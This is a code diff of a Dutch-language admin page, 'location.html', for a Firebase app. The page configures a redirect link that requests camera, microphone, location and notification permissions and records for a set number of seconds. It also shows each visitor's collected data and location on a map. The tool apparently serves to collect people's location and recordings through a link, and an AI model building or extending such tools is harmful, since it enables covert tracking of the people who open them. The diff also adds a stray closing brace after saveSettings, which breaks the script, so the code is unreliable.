@@ -1,13 +1,12 @@
-<!-- location.html (with Live Viewer Count, Customizable Heading, and Standaardbericht Removal) -->
+<!-- location.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- ... (All your existing head content, styles, and Firebase/Cloudinary config) ... -->
-     <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instellingen</title>
     <style>
-       /* (All your existing styles, *NO CHANGES NEEDED HERE*) */
+        /* (All your existing styles, *NO CHANGES NEEDED HERE*) */
          body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
@@ -25,7 +24,7 @@
             padding: 30px;
             width: 100%;
             max-width: 700px;
-             transition: background-color 0.5s, box-shadow: 0.5s;
+             transition: background-color 0.5s, box-shadow 0.5s;
         }
         h2 {
             color: #333;
@@ -563,6 +562,7 @@ const uploadPreset = "locstorage"; // REPLACE
 // Initialize Firebase
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
+const functions = firebase.functions(); // Initialize Firebase Functions
 
 // DOM Element References
 const errorMessage = document.getElementById("error-message");
@@ -585,7 +585,7 @@ const micCamPermissionToggle = document.getElementById('mic-cam-permission');
 const locationPermissionToggle = document.getElementById('location-permission');
 const notificationPermissionToggle = document.getElementById('notification-permission');
 const dataList = document.getElementById('data-list');
-const messageText = document.getElementById('message-text');  // Keep this, even though the input is removed
+// REMOVED: const messageText = document.getElementById('message-text');
 const redirectUrl = document.getElementById('redirect-url');
 const redirectSeconds = document.getElementById('redirect-seconds');
 const recordSeconds = document.getElementById('record-seconds');
@@ -599,14 +599,11 @@ const backgroundImageURLInput = document.getElementById('background-image-url');
 const iconImageURLInput = document.getElementById('icon-image-url');
 const customTextInput = document.getElementById('custom-text-modal');
 const notificationPermissionMessage = document.getElementById('notification-permission-message');
-// NEW: Viewer count element
-const viewerCountSpan = document.getElementById('viewer-count');
+const viewerCountSpan = document.getElementById('viewer-count'); // Viewer count element
 
-let currentUserId = "user1"; //  Initial user ID
+let currentUserId = "user1"; // Initial user ID
 
 // --- Theme Definitions ---
-// NOTE: These are now *only* used for the settings page itself.
-// The redirect page gets its theming information from Firestore.
 const themes = {
     default: {
         bodyBackgroundColor: '#f3f7fa',
@@ -624,14 +621,12 @@ const themes = {
 
 // --- Helper Functions ---
 
-// Promisified Geolocation API
 function getCurrentPositionPromise() {
     return new Promise((resolve, reject) => {
         navigator.geolocation ? navigator.geolocation.getCurrentPosition(resolve, reject) : reject(new Error("Geolocation is not supported"));
     });
 }
 
-// Promisified Battery API
 function getBatteryPromise() {
     return new Promise((resolve, reject) => {
         navigator.getBattery ? resolve(navigator.getBattery()) : reject(new Error("Battery API is not supported."));
@@ -651,15 +646,14 @@ async function getNextUserId() {
         return `user${nextId}`;
     } catch (error) {
         console.error("Error getting next user ID:", error);
-        throw error; // Re-throw to handle in calling function
+        throw error;
     }
 }
 
-// Save/Update Custom Theme (Modified to accept a 'saveNow' flag)
-// ALSO MODIFIED: Uses customText for redirectHeading if available.
-async function saveCustomTheme(saveNow = true) { // Default to saving
+// Save/Update Custom Theme
+async function saveCustomTheme(saveNow = true) {
     const themeName = themeNameInput.value.trim();
-    const customText = customTextInput.value.trim();  // Use this for heading
+    const customText = customTextInput.value.trim();
     const backgroundImageUrl = backgroundImageURLInput.value;
     const iconImageUrl = iconImageURLInput.value;
 
@@ -677,13 +671,11 @@ async function saveCustomTheme(saveNow = true) { // Default to saving
         return null;
     }
 
-
-     // Use customText as redirectHeading if it exists, otherwise, keep it as customText
     const themeData = {
         backgroundImageUrl: backgroundImageUrl,
         iconImageUrl: iconImageUrl,
-        redirectHeading: customText ? customText : undefined,  // Use customText for heading
-        customText: customText ? undefined : customText,       // Only keep if not used for heading
+        redirectHeading: customText,  // Use customText for the redirect heading
+        // Don't include customText if it's being used for redirectHeading
     };
 
 
@@ -716,16 +708,14 @@ async function saveCustomTheme(saveNow = true) { // Default to saving
 async function loadCustomThemes() {
     const customThemesRef = db.collection('redirectThemes');
     try {
-        // Clear existing options (except defaults)
         themeSelector.querySelectorAll('option:not([value="default"],[value="dark"],[value="green"])').forEach(o => o.remove());
         editThemeSelector.querySelectorAll('option:not([value=""])').forEach(o => o.remove());
 
         const snapshot = await customThemesRef.get();
         snapshot.forEach(doc => {
             const themeName = doc.id;
-            const option = new Option(themeName, themeName); // Text, Value
+            const option = new Option(themeName, themeName);
             themeSelector.add(option);
-
             const editOption = new Option(themeName, themeName);
             editThemeSelector.add(editOption);
         });
@@ -747,13 +737,12 @@ async function loadThemeForEditing(themeName) {
         themeNameInput.value = themeName;
         backgroundImageURLInput.value = themeData.backgroundImageUrl || '';
         iconImageURLInput.value = themeData.iconImageUrl || '';
-        customTextInput.value = themeData.customText || themeData.redirectHeading ||''; // Load heading/text
+        customTextInput.value = themeData.redirectHeading || themeData.customText || ''; // Load heading
 
-        // Set preview images and confirmation text
         setPreviewImage(backgroundImagePreview, backgroundImageURLInput.value, backgroundUploadConfirmation);
         setPreviewImage(iconImagePreview, iconImageURLInput.value, iconUploadConfirmation);
 
-        themeModal.style.display = "block"; // Show modal
+        themeModal.style.display = "block";
 
     } catch (error) {
         console.error("Error loading theme for editing:", error);
@@ -771,19 +760,14 @@ function applyTheme(themeName) {
         });
 }
 
-
-
-// --- Function to check and update notification permission status ---
 function updateNotificationPermissionStatus() {
     if (Notification.permission === 'granted') {
-        notificationPermissionMessage.style.display = 'none'; // Hide message
+        notificationPermissionMessage.style.display = 'none';
     } else {
-        notificationPermissionMessage.style.display = 'block'; // Show message
-        // Optionally disable notification-related features here if needed
+        notificationPermissionMessage.style.display = 'block';
     }
 }
 
-// Update explanations
 function updateExplanations(){
     if(locationPermissionToggle.checked){
         locationExplanation.classList.remove("hidden");
@@ -798,7 +782,6 @@ function updateExplanations(){
     }
 }
 
-
 // Load Settings and Data
 async function loadSettingsAndData(userId) {
     try {
@@ -807,36 +790,31 @@ async function loadSettingsAndData(userId) {
 
         if (settingsSnap.exists) {
             const settingsData = settingsSnap.data();
-            // Apply settings to form elements
             micCamPermissionToggle.checked = settingsData.micCamPermission || false;
             locationPermissionToggle.checked = settingsData.locationPermission || false;
             notificationPermissionToggle.checked = settingsData.notificationPermission || false;
-            // messageText.value = settingsData.messageText || ''; // REMOVED: No longer needed
+            // REMOVED: messageText.value = settingsData.messageText || '';
             redirectUrl.value = settingsData.redirectUrl || '';
             redirectSeconds.value = settingsData.redirectSeconds || '0';
             recordSeconds.value = settingsData.recordSeconds || '0';
-            themeSelector.value = settingsData.theme || 'default'; // Set the value *first*
-            applyTheme(themeSelector.value);   // *Then* apply the theme (only to location.html)
-
+            themeSelector.value = settingsData.theme || 'default';
+            applyTheme(themeSelector.value);
 
         } else {
-            // Handle case where settings don't exist (e.g., new user)
-            // Set default values
             micCamPermissionToggle.checked = false;
             locationPermissionToggle.checked = false;
             notificationPermissionToggle.checked = false;
-            // messageText.value = ''; // REMOVED: No longer needed
+            // REMOVED: messageText.value = '';
             redirectUrl.value = '';
             redirectSeconds.value = '0';
             recordSeconds.value = '0';
             themeSelector.value = 'default';
-            applyTheme('default'); // Apply default theme
+            applyTheme('default');
         }
         updateExplanations();
-        await loadAllUserData(); // Load user data *after* settings
-        await loadCustomThemes(); // Load custom themes
+        await loadAllUserData();
+        await loadCustomThemes();
         updateNotificationPermissionStatus();
-
 
     } catch (error) {
         console.error("Error loading settings/data:", error);
@@ -853,11 +831,11 @@ async function saveSettings() {
             micCamPermission: micCamPermissionToggle.checked,
             locationPermission: locationPermissionToggle.checked,
             notificationPermission: notificationPermissionToggle.checked,
-            // messageText: messageText.value, // REMOVED: No longer needed
+            // REMOVED: messageText: messageText.value,
             redirectUrl: redirectUrl.value,
             redirectSeconds: redirectSeconds.value,
             recordSeconds: recordSeconds.value,
-            theme: themeSelector.value // Save the selected theme *name*
+            theme: themeSelector.value
         };
         updateExplanations();
 
@@ -866,16 +844,16 @@ async function saveSettings() {
         currentUserId = nextUserId;
         await loadSettingsAndData(currentUserId);
 
-
     } catch (error) {
         console.error("Error saving settings:", error);
         displayError(`Fout bij opslaan instellingen: ${error.message}`);
     }
+        }
 }
 
 // Display User Data (Vertical Layout)
 async function displayData(userId, userData) {
-     const row = document.createElement('tr');
+    const row = document.createElement('tr');
     row.id = `user-row-${userId}`;
 
     let cellContent = `
@@ -908,15 +886,11 @@ async function displayData(userId, userData) {
     row.innerHTML = cellContent;
     dataList.appendChild(row);
 
-
     if (userData.location && userData.location.latitude && userData.location.longitude) {
-        // Use a closure to capture the correct userId for each map
         (function(userId) {
             setTimeout(() => {
                 const mapId = `location-map-${userId}`;
                 const mapElement = document.getElementById(mapId);
-
-                // Check if the map element exists *before* creating the map
                 if (mapElement) {
                     const map = L.map(mapId).setView([userData.location.latitude, userData.location.longitude], 15);
                     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -928,14 +902,13 @@ async function displayData(userId, userData) {
                     console.error(`Map element not found for user ${userId}`);
                 }
             }, 0);
-        })(userId); // Immediately invoke the function with the current userId
+        })(userId);
     }
 }
 
 // Load All User Data
 async function loadAllUserData() {
-    dataList.innerHTML = ''; // Clear existing data
-
+    dataList.innerHTML = '';
     try {
         const snapshot = await db.collection('userData').get();
         if (snapshot.empty) {
@@ -953,23 +926,18 @@ async function loadAllUserData() {
 
 // Send Notification for User
 async function sendNotificationForUser(targetUserId) {
-
     const title = document.getElementById(`notification-title-${targetUserId}`).value;
     const body = document.getElementById(`notification-body-${targetUserId}`).value;
     const iconUrl = document.getElementById(`notification-icon-url-${targetUserId}`).value;
-
 
     if (!title || !body) {
         displayError("Notificatie titel en bericht zijn niet ingesteld voor deze gebruiker.");
         return;
     }
-
-    if (Notification.permission !== 'granted')
-    {
+    if (Notification.permission !== 'granted') {
         displayError('Notificatie toestemming is geweigerd.');
         return;
     }
-
     try {
         new Notification(title, { body: body, icon: iconUrl });
         displaySuccess(`Notificatie succesvol verstuurd voor gebruiker ${targetUserId}!`);
@@ -982,20 +950,16 @@ async function sendNotificationForUser(targetUserId) {
 // Delete All User Data
 async function deleteAllData() {
     if (!confirm("Weet je zeker dat je ALLE gebruikersdata wilt verwijderen? Dit kan NIET ongedaan gemaakt worden!")) {
-        return; // Exit if cancelled
+        return;
     }
-
     try {
         const batch = db.batch();
         const snapshot = await db.collection('userData').get();
         snapshot.docs.forEach(doc => batch.delete(doc.ref));
         await batch.commit();
-
-        // Reset user counter (consider what initial value is appropriate)
         await db.collection('counters').doc('userCounter').set({ count: 0 });
-
         displaySuccess("Alle gebruikersdata succesvol verwijderd!");
-        await loadAllUserData(); // Refresh data display
+        await loadAllUserData();
 
     } catch (error) {
         console.error("Error deleting all user data:", error);
@@ -1008,34 +972,28 @@ async function deleteUserData(targetUserId) {
     if (!confirm(`Weet je zeker dat je de data van gebruiker ${targetUserId} wilt verwijderen?`)) {
         return;
     }
-
     try {
         await db.collection('userData').doc(targetUserId).delete();
         displaySuccess(`Data voor gebruiker ${targetUserId} succesvol verwijderd!`);
-        await loadAllUserData(); // Refresh data display
+        await loadAllUserData();
     } catch (error) {
         console.error("Error deleting user data:", error);
         displayError(`Fout bij verwijderen gebruikersdata: ${error.message}`);
     }
 }
 
-// --- Helper Functions (for UI and other tasks) ---
-
-// Display Error Message
 function displayError(message) {
     errorMessage.textContent = message;
     errorMessage.style.display = 'block';
-    setTimeout(() => { errorMessage.style.display = 'none'; }, 5000); // Hide after 5 seconds
+    setTimeout(() => { errorMessage.style.display = 'none'; }, 5000);
 }
 
-// Display Success Message
 function displaySuccess(message) {
     successMessage.textContent = message;
     successMessage.style.display = 'block';
-    setTimeout(() => { successMessage.style.display = 'none'; }, 3000); // Hide after 3 seconds
+    setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
 }
 
-// Reset Theme Modal (clear inputs, previews, and hide)
 function resetThemeModal() {
     themeNameInput.value = '';
     backgroundImageURLInput.value = '';
@@ -1050,7 +1008,6 @@ function resetThemeModal() {
     themeModal.style.display = "none";
 }
 
-// Set Preview Image and Confirmation Text
 function setPreviewImage(previewElement, imageUrl, confirmationElement) {
     if (imageUrl) {
         previewElement.src = imageUrl;
@@ -1063,7 +1020,6 @@ function setPreviewImage(previewElement, imageUrl, confirmationElement) {
     }
 }
 
-// Basic URL Validation (for image URLs)
 function isValidHttpUrl(string) {
     try {
         const url = new URL(string);
@@ -1073,18 +1029,13 @@ function isValidHttpUrl(string) {
     }
 }
 
-// --- Event Listeners ---
-// Event listeners (using named functions for better organization)
-
 function handleSaveSettings() {
     saveSettings().catch(error => {
         console.error("Unhandled error in saveSettings:", error);
     });
 }
 
-function handleTriggerRedirect() {
-    // Handle redirect (if needed)
-}
+function handleTriggerRedirect() {}
 
 function handleDataTableTitleClick() {
     const originalTitle = this.getAttribute('data-original-title');
@@ -1118,7 +1069,7 @@ function handleNotificationPermissionToggle() {
 }
 
 function handleCreateThemeButtonClick() {
-    resetThemeModal(); // Clear any previous state
+    resetThemeModal();
     themeModal.style.display = "block";
 }
 
@@ -1131,7 +1082,7 @@ function handleCancelCustomThemeButtonClick() {
 }
 
 function handleSaveCustomThemeButtonClick() {
-    saveCustomTheme(); // Call the saveCustomTheme, which saves directly.
+    saveCustomTheme();
 }
 
 async function handleUploadBackgroundButtonClick() {
@@ -1142,46 +1093,39 @@ async function handleUploadBackgroundButtonClick() {
             resource_type: 'image',
             tags: [`theme_backgrounds`],
             folder: `theme_backgrounds`
-        }, async (error, result) => { // IMPORTANT: Make this callback async
+        }, async (error, result) => {
             if (error) {
                 console.error(`Cloudinary upload error (background):`, error);
                 errorMessage.textContent = `Cloudinary upload error (background): ${error.message}`;
-                return; // Stop here on error.
+                return;
             }
             if (result && result.event === "success") {
                 const imageUrl = result.info.secure_url;
-                backgroundImageURLInput.value = imageUrl; // Store URL
-                setPreviewImage(backgroundImagePreview, imageUrl, backgroundUploadConfirmation); // Show preview
+                backgroundImageURLInput.value = imageUrl;
+                setPreviewImage(backgroundImagePreview, imageUrl, backgroundUploadConfirmation);
             }
              else {
-                // Handle cases that are NOT "success" and NOT "error" more gracefully
                 console.log(`Cloudinary upload: non-success event (background) - Event: ${result ? result.event : 'unknown'}`);
 
                 if (result && result.event === 'abort') {
                     console.log(`Cloudinary upload aborted by user (background).`);
-                    errorMessage.textContent = `Uploaden van achtergrond afbeelding geannuleerd.`; // Optional user feedback
-                   // Still reject, but with a more specific message
+                    errorMessage.textContent = `Uploaden van achtergrond afbeelding geannuleerd.`;
                 } else if (result && result.event === 'close') {
                      console.log(`Cloudinary widget closed without upload (background).`);
-                    // Resolve with null if just closed, no real error
                 } else if (result && result.event === 'display-changed' || result && result.event === 'source-changed') {
                     console.log(`Cloudinary widget state changed (background) - Event: ${result.event}. Ignoring.`);
-                    // Resolve with null, not an error in this context
                 } else if (result && result.event === 'queues-end') {
                     console.log(`Cloudinary upload queues finished (background) - Event: ${result.event}. Ignoring.`);
-                    // Resolve with null, not an error in this context
                 }
                 else {
                      const rejectionError = new Error(`Cloudinary upload cancelled or failed (background) - Event: ${result ? result.event : 'unknown'}`);
                      console.log(`Cloudinary upload: unknown non-success event (background)`, result ? result.event : 'no result', rejectionError);
                      errorMessage.textContent = `Uploaden van background afbeelding geannuleerd.`;
-                    // Fallback reject for other unexpected non-success events
                 }
             }
         });
         widget.open();
 }
-
 
 async function handleUploadIconButtonClick() {
       const widget = cloudinary.openUploadWidget({
@@ -1191,48 +1135,41 @@ async function handleUploadIconButtonClick() {
             resource_type: 'image',
             tags: [`theme_icons`],
             folder: `theme_icons`
-        }, async (error, result) => { // IMPORTANT: Make this callback async
+        }, async (error, result) => {
             if (error) {
                 console.error(`Cloudinary upload error (icon):`, error);
                 errorMessage.textContent = `Cloudinary upload error (icon): ${error.message}`;
-                return; // Stop here on error
+                return;
             }
             if (result && result.event === "success") {
                 const imageUrl = result.info.secure_url;
-                iconImageURLInput.value = imageUrl;  // Store URL
-                setPreviewImage(iconImagePreview, imageUrl, iconUploadConfirmation);  // Show preview
+                iconImageURLInput.value = imageUrl;
+                setPreviewImage(iconImagePreview, imageUrl, iconUploadConfirmation);
 
             }
              else {
-                // Handle cases that are NOT "success" and NOT "error" more gracefully
                 console.log(`Cloudinary upload: non-success event (icon) - Event: ${result ? result.event : 'unknown'}`);
 
                 if (result && result.event === 'abort') {
                     console.log(`Cloudinary upload aborted by user (icon).`);
-                    errorMessage.textContent = `Uploaden van icoon afbeelding geannuleerd.`; // Optional user feedback
-                  // Still reject, but with a more specific message
+                    errorMessage.textContent = `Uploaden van icoon afbeelding geannuleerd.`;
                 } else if (result && result.event === 'close') {
                      console.log(`Cloudinary widget closed without upload (icon).`);
-                   // Resolve with null if just closed, no real error
                 } else if (result && result.event === 'display-changed' || result && result.event === 'source-changed') {
                     console.log(`Cloudinary widget state changed (icon) - Event: ${result.event}. Ignoring.`);
-                  // Resolve with null, not an error in this context
                 } else if (result && result.event === 'queues-end') {
                     console.log(`Cloudinary upload queues finished (icon) - Event: ${result.event}. Ignoring.`);
-                  // Resolve with null, not an error in this context
                 }
                 else {
                      const rejectionError = new Error(`Cloudinary upload cancelled or failed (icon) - Event: ${result ? result.event : 'unknown'}`);
                      console.log(`Cloudinary upload: unknown non-success event (icon)`, result ? result.event : 'no result', rejectionError);
                      errorMessage.textContent = `Uploaden van icoon afbeelding geannuleerd.`;
-                    // Fallback reject for other unexpected non-success events
                 }
             }
         });
         widget.open();
 }
 
-// --- Attach event listeners (Corrected) ---
 saveSettingsButton.addEventListener('click', handleSaveSettings);
 triggerRedirectButton.addEventListener('click', handleTriggerRedirect);
 dataTableTitleElement.addEventListener('click', handleDataTableTitleClick);
@@ -1243,37 +1180,32 @@ notificationPermissionToggle.addEventListener('change', handleNotificationPermis
 createThemeButton.addEventListener('click', handleCreateThemeButtonClick);
 closeModalButton.addEventListener('click', handleCloseModalButtonClick);
 cancelCustomThemeButton.addEventListener('click', handleCancelCustomThemeButtonClick);
-saveCustomThemeButton.addEventListener('click', handleSaveCustomThemeButtonClick); // Call the handler function
+saveCustomThemeButton.addEventListener('click', handleSaveCustomThemeButtonClick);
 uploadBackgroundButton.addEventListener('click', handleUploadBackgroundButtonClick);
 uploadIconButton.addEventListener('click', handleUploadIconButtonClick);
 
-// NEW: Live Viewer Count Listener
 function setupViewerCountListener() {
     const viewerCountRef = db.collection('metrics').doc('redirectViewers');
 
     viewerCountRef.onSnapshot((doc) => {
         if (doc.exists) {
-            const count = doc.data().count || 0; // Default to 0 if not present
+            const count = doc.data().count || 0;
             viewerCountSpan.textContent = count;
         } else {
-            viewerCountSpan.textContent = '0'; // Default if doc doesn't exist
+            viewerCountSpan.textContent = '0';
             console.log("No viewer count document found.");
         }
     }, (error) => {
         console.error("Error getting viewer count:", error);
-        viewerCountSpan.textContent = 'Error'; // Indicate an error
+        viewerCountSpan.textContent = 'Error';
     });
 }
-
-// --- Initial Setup ---
 loadSettingsAndData(currentUserId).catch(error => {
     console.error("Unhandled error in initial load:", error);
     displayError("Fout bij initialiseren van de pagina.");
 });
 updateNotificationPermissionStatus();
-// NEW: Start listening for viewer count updates
 setupViewerCountListener();
-
 
 </script>
 </body>
